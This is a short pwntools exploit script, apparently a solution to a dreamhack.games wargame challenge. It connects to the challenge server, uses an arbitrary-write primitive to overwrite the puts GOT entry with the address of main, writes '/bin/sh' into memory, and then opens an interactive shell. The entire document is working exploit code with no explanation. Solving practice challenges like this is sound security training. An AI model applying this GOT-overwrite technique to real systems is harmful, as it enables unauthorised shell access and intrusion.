from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 16939
r = remote(HOST, PORT)

main=0x4011f6
puts_got=0x404020
binsh=0x404080

r.sendlineafter(b'pt', b'%d'%puts_got)
r.sendlineafter(b'input: ', p64(main))
r.sendlineafter(b'pt', b'%d'%binsh)
r.sendlineafter(b'input: ', b'/bin/sh')

r.interactive()